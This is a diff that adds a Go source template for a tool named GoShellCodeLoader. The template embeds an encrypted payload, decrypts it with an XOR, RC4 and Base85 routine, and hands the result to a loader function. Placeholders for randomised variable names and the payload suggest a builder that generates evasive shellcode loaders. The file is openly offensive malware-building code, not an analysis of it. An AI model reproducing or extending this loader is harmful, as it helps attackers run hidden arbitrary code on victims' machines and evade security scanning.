@@ -1,0 +1,16 @@
+package main
+
+import (
+	"GoShellCodeLoader/Crypto"
+	"GoShellCodeLoader/Loader"
+)
+
+func main() {
+	{{.keyName}} := []byte("{{.keyValue}}")
+
+	{{.encrypt}} := "{{.payload}}"
+
+	{{.decrypt}}, _ := Crypto.XORRC4Base85Decrypt({{.encrypt}}, {{.keyName}})
+
+	Loader.BaseLoader({{.decrypt}})
+}
